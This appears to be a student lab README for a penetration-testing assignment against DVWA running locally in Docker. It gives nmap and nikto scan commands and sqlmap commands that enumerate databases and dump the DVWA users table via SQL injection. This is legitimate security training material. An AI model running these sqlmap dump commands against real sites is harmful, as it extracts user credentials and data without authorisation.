# Week-2 VAPT Assignment 

## Objective
The goal of this assignment is to simulate a **Vulnerability Assessment & Penetration Test (VAPT)** on the Damn Vulnerable Web Application (**DVWA**) running in Docker.  
We focus on identifying, exploiting, and documenting **SQL Injection vulnerabilities** following a structured methodology.

---

## ⚙ Environment Setup

**Start DVWA in Docker:**
```bash
sudo docker run -it -p 8080:80 vulnerables/web-dvwa
```
## Verify:
```bash
sudo docker ps
# Screenshot: ./screenshots/01_docker_running.png
```
## Recon / Scanning
Port & service:
```bash
nmap -sV -p- localhost -oN logs/nmap_full.txt
nmap -sV -p 8080 localhost -oN logs/nmap_8080.txt
# Screenshot: ./screenshots/02_nmap_scan.png

```
Web scan:
```bash
nikto -h http://localhost:8080 -o logs/nikto.txt
# Screenshot: ./screenshots/03_nikto_scan.png
```

## Exploitation (SQLi)
Set DVWA security to low in the web UI and get PHPSESSID cookie, then:
DB enumeration:
```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session>; security=low" --batch --dbs \
  -o logs/sqlmap_dbs.txt
# Screenshot: ./screenshots/04_sqlmap_dbs.png
```
List tables:
```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session>; security=low" -D dvwa --tables --batch \
  -o logs/sqlmap_tables.txt
# Screenshot: ./screenshots/05_sqlmap_tables.png
```
Dump users:
```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session>; security=low" -D dvwa -T users --dump --batch \
  -o logs/sqlmap_dump.txt
# Screenshot: ./screenshots/06_sqlmap_dump.png
```








